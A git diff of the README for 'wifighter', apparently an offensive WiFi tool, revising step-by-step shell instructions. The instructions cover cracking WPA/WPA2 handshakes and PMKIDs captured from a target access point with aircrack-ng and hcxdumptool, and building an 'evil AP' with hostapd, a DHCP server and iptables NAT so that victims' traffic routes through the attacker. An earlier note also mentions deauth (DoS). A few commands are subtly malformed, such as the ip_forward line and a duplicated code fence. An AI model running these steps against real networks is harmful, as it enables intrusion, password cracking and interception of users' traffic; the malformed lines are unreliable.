@@ -47,31 +47,22 @@ sudo ./wifighter.py
 ```
 
 
-## WiFi Scan & Select
-- WPS scan?
 
-## Attacking
-- wps cracking (testing)
+## Bugs & Notes
 - monitor start listen command error still switches the NIC to monitor
 
-
 ## Future visions
-- vyber vice wordlistu najednou?
+- choose more wordlists for cracking
 - Utilize hashcat & xctools - HW acc. cracking & generating wordlists, conversions?
+
 
 ## REMEMBER !!
 - create requirements.txt
-
-- dependencies a install script
-
+- dependencies and install script
 
 
-### 1. WPA/WPA2 Handshake Crack
 
-**Aircrack guide**
-- WPA, WEP Cracking
-- WiFi Scanning
-- AP Deauth (DoS)
+### 1. WPA/WPA2 Handshake Crack using aircrack-ng
 
 **Monitor mode**
 
@@ -126,7 +117,7 @@ Verify captured handshake
 sudo aircrack-ng <HANDSHAKE>.cap 
 ```
 
-**Crack handshake - aircrack**
+**Crack handshake**
 
 ```sh
 sudo aircrack-ng -w <WORDLIST> -b <TARGET_AP_MAC> <HANDSHAKE>.cap
@@ -163,7 +154,7 @@ wifighter start <INTERFACE>
 
 Capture PMKID
 ```sh
-sudo hcxdumptool -o <OUTPUT_CAPTURE_FILE> -i <INTERFACE> --enable_status=3 --filtermode=2 --filterlist_ap=<TARGET_AP_LIST>
+sudo hcxdumptool -o <OUTPUT_CAPTURE_FILE> -i <INTERFACE> -c <CHANNEL> --enable_status=3 --filtermode=2 --filterlist_ap=<TARGET_AP_MAC>
 ```
 
 Convert capture into the hash format
@@ -183,14 +174,14 @@ Install dependencies
 sudo zypper in hostapd dhcp-server iptables
 ```
 
-Set dhcp server listenning interface
+Set dhcp server's listenning interface
 ```sh
 nano /etc/sysconfig/dhcpd 
-
-DHCPD_INTERFACE="<LISTEN_INTRFACE>"
+```sh
+DHCPD_INTERFACE="<EVIL_AP_INTERFACE>"
 ```
 
-Set dhcp server configuration
+Set dhcp server's configuration
 ```sh
 nano /etc/dhcpd.conf
 ```
@@ -202,19 +193,20 @@ max-lease-time 7200;
 subnet 192.168.100.0 netmask 255.255.255.0 {
     range 192.168.100.2 192.168.100.254;
     option subnet-mask 255.255.255.0;
+    option routers 192.168.100.1;
     option broadcast-address 192.168.100.255;
 }
 ```
 
-Set Fake AP configuration
+Set evil AP's configuration
 ```sh
 nano /etc/hostapd.conf
 ```
 ```sh
-interface=wlp99s0f3u2
+interface=<EVIL_AP_INTERFACE>
 driver=nl80211
 
-ssid=Fake_AP
+ssid=<SSID>
 channel=1
 
 hw_mode=g
@@ -224,19 +216,29 @@ macaddr_acl=0
 auth_algs=1
 wpa=2
 wpa_key_mgmt=WPA-PSK
-wpa_passphrase=81203666
+wpa_passphrase=<PASSWORD>
 rsn_pairwise=CCMP
 ```
 
-Configure fake AP interface
+Configure evil AP's interface
 ```sh
-sudo ip addr add 192.168.100.1/24 dev <INTERFACE>
-route add -net 192.168.100.0 netmask 255.255.255.0 gw 192.168.100.1
+sudo ip addr add 192.168.100.1/24 dev <EVIL_AP_INTERFACE>
 ```
 
 Enable internet connection for clients
 ```sh
+sudo iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o <INTERNET_INTERFACE> -j MASQUERADE
+
+sudo iptables -A FORWARD -i <EVIL_AP_INTERFACE> -o <INTERNET_INTERFACE> -j ACCEPT
+
+sudo iptables -A FORWARD -i <INTERNET_INTERFACE> -o <EVIL_AP_INTERFACE> -m state --state RELATED,ESTABLISHED -j ACCEPT
+
 sudo tee | echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+Prevent NetworkManager from managing the evil ap's interface
+```sh
+sudo nmcli dev set <EVIL_AP_INTERFACE> managed no
 ```
 
 Start the fake AP
